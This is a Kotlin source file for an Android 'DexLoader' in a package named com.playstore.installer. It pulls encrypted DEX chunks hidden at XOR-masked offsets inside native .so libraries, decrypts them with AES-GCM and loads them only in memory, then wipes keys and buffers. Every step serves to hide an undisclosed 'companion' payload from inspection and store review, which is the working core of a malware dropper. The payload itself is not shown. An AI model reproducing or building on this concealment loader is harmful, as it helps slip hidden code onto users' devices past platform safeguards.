package com.playstore.installer

import android.annotation.SuppressLint
import android.content.Context
import android.os.Build
import dalvik.system.InMemoryDexClassLoader
import java.io.File
import java.io.RandomAccessFile
import java.nio.ByteBuffer
import java.security.MessageDigest
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

/**
 * DexLoader — Phase 3 + Phase 4
 *
 * Reads encrypted DEX chunks from .so files at XOR-unmasked offsets.
 * Reassembles chunks in correct sequence order.
 * Decrypts with AES-256-GCM using key from ChunkConstants.
 * Loads via InMemoryDexClassLoader — DEX never written to disk.
 * Wipes all sensitive buffers immediately after loading.
 *
 * Requirements:
 *   - Android API 26+ for InMemoryDexClassLoader
 *   - ChunkConstants.kt (auto-generated per build by chunk_constants_gen.py)
 */
object DexLoader {

    private const val CHUNK_MAGIC = 0x4B43484E  // "NCHK" little-endian
    private const val DEX_MAGIC   = 0x58454E44  // "NDEX" little-endian
    private const val GCM_TAG_LEN = 128          // bits
    private const val AAD         = "nova_companion_dex"

    @Volatile private var companionClassLoader: ClassLoader? = null
    @Volatile private var loadComplete: Boolean = false
    @Volatile private var loadError: String? = null

    /**
     * Load companion DEX from encrypted .so chunks.
     * Returns the companion ClassLoader on success, null on failure.
     * Thread-safe — can be called from any thread.
     */
    @SuppressLint("NewApi")
    fun loadCompanionDex(context: Context): ClassLoader? {
        // Return cached loader if already loaded
        if (loadComplete && companionClassLoader != null) {
            return companionClassLoader
        }
        if (loadError != null) return null

        return try {
            val loader = doLoad(context)
            companionClassLoader = loader
            loadComplete = true
            loader
        } catch (e: Exception) {
            loadError = e.message
            loadComplete = true
            null
        }
    }

    @SuppressLint("NewApi")
    private fun doLoad(context: Context): ClassLoader {
        val nChunks = ChunkConstants.N_CHUNKS
        val is64bit = Build.SUPPORTED_64_BIT_ABIS.isNotEmpty()

        // ── Step 1: Read all chunks from .so files ────────────────────────
        val rawChunks = mutableMapOf<Int, ByteArray>()

        for (i in 0 until nChunks) {
            val soName     = ChunkConstants.getSoName(i)
            val maskedOff  = ChunkConstants.getMaskedOffset(i, is64bit)
            val maskedSz   = ChunkConstants.getMaskedSize(i, is64bit)
            val offset     = ChunkConstants.unmaskOffset(maskedOff)
            val size       = ChunkConstants.unmaskSize(maskedSz)

            val soPath = findSoPath(context, soName)
                ?: throw IllegalStateException("Missing .so: $soName")

            val chunkWithHeader = readBytesAt(soPath, offset, size)
            rawChunks[i] = chunkWithHeader
        }

        // ── Step 2: Validate and strip chunk headers ──────────────────────
        val chunkData = mutableMapOf<Int, ByteArray>()
        var totalChunksVerified = 0

        for ((idx, tagged) in rawChunks) {
            val parsed = parseChunkHeader(tagged, idx, nChunks)
            chunkData[idx] = parsed
            totalChunksVerified++
        }

        if (totalChunksVerified != nChunks) {
            throw IllegalStateException("Chunk count mismatch: got $totalChunksVerified expected $nChunks")
        }

        // ── Step 3: Reassemble encrypted blob in sequence order ───────────
        val reassembled = reassembleChunks(chunkData, nChunks)

        // ── Step 4: Verify dual integrity hashes ─────────────────────────
        verifyIntegrity(reassembled)

        // ── Step 5: Decrypt with AES-256-GCM ─────────────────────────────
        val aesKey = ChunkConstants.getAesKey()
        val aesIv  = ChunkConstants.getAesIv()
        val decrypted = decryptDex(reassembled, aesKey, aesIv)

        // Wipe key and IV from memory immediately after use
        aesKey.fill(0)
        aesIv.fill(0)
        reassembled.fill(0)

        // ── Step 6: Parse packed DEX format ──────────────────────────────
        val dexBuffers = unpackDex(decrypted)

        // Wipe decrypted bytes
        decrypted.fill(0)

        // ── Step 7: Load via InMemoryDexClassLoader ───────────────────────
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            throw UnsupportedOperationException("InMemoryDexClassLoader requires API 26+")
        }

        val bufferArray = dexBuffers.map { ByteBuffer.wrap(it) }.toTypedArray()
        val loader = InMemoryDexClassLoader(bufferArray, context.classLoader)

        // Wipe DEX buffers after loading
        for (buf in dexBuffers) {
            buf.fill(0)
        }

        return loader
    }

    // ── Chunk parsing ─────────────────────────────────────────────────────────

    private fun parseChunkHeader(tagged: ByteArray, expectedIdx: Int, totalChunks: Int): ByteArray {
        if (tagged.size < 44) {
            throw IllegalStateException("Chunk $expectedIdx too small: ${tagged.size}")
        }

        val magic = readInt32LE(tagged, 0)
        if (magic.toLong() and 0xFFFFFFFFL != CHUNK_MAGIC.toLong() and 0xFFFFFFFFL) {
            throw IllegalStateException("Invalid chunk magic at index $expectedIdx: 0x${magic.toString(16)}")
        }

        val idx        = readInt16LE(tagged, 4)
        val nChunks    = readInt16LE(tagged, 6)
        val chunkSize  = readInt32LE(tagged, 8)
        val storedHash = tagged.slice(12..43).toByteArray()

        if (idx != expectedIdx) {
            throw IllegalStateException("Chunk index mismatch: got $idx expected $expectedIdx")
        }
        if (nChunks != totalChunks) {
            throw IllegalStateException("Total chunks mismatch: got $nChunks expected $totalChunks")
        }

        val headerSize = 44
        if (tagged.size < headerSize + chunkSize) {
            throw IllegalStateException("Chunk $idx data truncated")
        }

        val data = tagged.slice(headerSize until headerSize + chunkSize).toByteArray()

        // Verify SHA-256 of chunk data
        val computed = MessageDigest.getInstance("SHA-256").digest(data)
        if (!computed.contentEquals(storedHash)) {
            throw IllegalStateException("Chunk $idx integrity check failed")
        }

        return data
    }

    private fun reassembleChunks(chunks: Map<Int, ByteArray>, nChunks: Int): ByteArray {
        var totalSize = 0
        for (i in 0 until nChunks) {
            totalSize += chunks[i]?.size ?: throw IllegalStateException("Missing chunk $i")
        }

        val result = ByteArray(totalSize)
        var pos = 0
        for (i in 0 until nChunks) {
            val chunk = chunks[i]!!
            chunk.copyInto(result, pos)
            pos += chunk.size
        }
        return result
    }

    // ── Integrity verification ────────────────────────────────────────────────

    private fun verifyIntegrity(data: ByteArray) {
        // SHA-256 check (fast)
        val sha256 = MessageDigest.getInstance("SHA-256").digest(data)
        val sha256hex = sha256.joinToString("") { "%02x".format(it) }
        if (sha256hex != ChunkConstants.SHA256_HASH) {
            throw IllegalStateException("SHA-256 integrity check failed")
        }

        // SHA-512 check (second hash)
        val sha512 = MessageDigest.getInstance("SHA-512").digest(data)
        val sha512hex = sha512.joinToString("") { "%02x".format(it) }
        if (sha512hex != ChunkConstants.SHA512_HASH) {
            throw IllegalStateException("SHA-512 integrity check failed")
        }
    }

    // ── AES-256-GCM decryption ────────────────────────────────────────────────

    private fun decryptDex(encrypted: ByteArray, key: ByteArray, iv: ByteArray): ByteArray {
        // Format: [4-byte AAD len][AAD bytes][ciphertext+tag]
        val aadLen = readInt32LE(encrypted, 0)
        val aad    = encrypted.slice(4 until 4 + aadLen).toByteArray()
        val cipher = encrypted.slice(4 + aadLen until encrypted.size).toByteArray()

        val secretKey = SecretKeySpec(key, "AES")
        val gcmSpec   = GCMParameterSpec(GCM_TAG_LEN, iv)
        val c         = Cipher.getInstance("AES/GCM/NoPadding")
        c.init(Cipher.DECRYPT_MODE, secretKey, gcmSpec)
        c.updateAAD(aad)

        return c.doFinal(cipher)
    }

    // ── DEX unpacking ─────────────────────────────────────────────────────────

    private fun unpackDex(packed: ByteArray): List<ByteArray> {
        // Format: NDEX(4) + count(4) + [len(4) + data]...
        val magic = readInt32LE(packed, 0)
        if (magic.toLong() and 0xFFFFFFFFL != DEX_MAGIC.toLong() and 0xFFFFFFFFL) {
            throw IllegalStateException("Invalid DEX pack magic")
        }

        val count = readInt32LE(packed, 4)
        val dexList = mutableListOf<ByteArray>()
        var pos = 8

        for (i in 0 until count) {
            val len = readInt32LE(packed, pos)
            pos += 4
            val dex = packed.slice(pos until pos + len).toByteArray()
            dexList.add(dex)
            pos += len
        }

        return dexList
    }

    // ── .so file location ─────────────────────────────────────────────────────

    private fun findSoPath(context: Context, soName: String): String? {
        // Android provides the path to native libraries via applicationInfo
        val nativeDir = context.applicationInfo.nativeLibraryDir
        val file = File(nativeDir, soName)
        return if (file.exists()) file.absolutePath else null
    }

    // ── File I/O ──────────────────────────────────────────────────────────────

    private fun readBytesAt(path: String, offset: Long, size: Int): ByteArray {
        RandomAccessFile(path, "r").use { raf ->
            raf.seek(offset)
            val buf = ByteArray(size)
            var bytesRead = 0
            while (bytesRead < size) {
                val n = raf.read(buf, bytesRead, size - bytesRead)
                if (n < 0) throw IllegalStateException("EOF reading $path at offset $offset+$bytesRead")
                bytesRead += n
            }
            return buf
        }
    }

    // ── Byte utilities ────────────────────────────────────────────────────────

    private fun readInt32LE(b: ByteArray, offset: Int): Int {
        return (b[offset].toInt() and 0xFF) or
               ((b[offset+1].toInt() and 0xFF) shl 8) or
               ((b[offset+2].toInt() and 0xFF) shl 16) or
               ((b[offset+3].toInt() and 0xFF) shl 24)
    }

    private fun readInt16LE(b: ByteArray, offset: Int): Int {
        return (b[offset].toInt() and 0xFF) or
               ((b[offset+1].toInt() and 0xFF) shl 8)
    }

    /**
     * Check if DEX has been loaded successfully.
     */
    fun isLoaded(): Boolean = loadComplete && companionClassLoader != null

    /**
     * Get error message if loading failed.
     */
    fun getError(): String? = loadError

    /**
     * Wipe all cached state — call when companion is no longer needed.
     */
    fun wipe() {
        companionClassLoader = null
        loadComplete = false
        loadError = null
    }
}
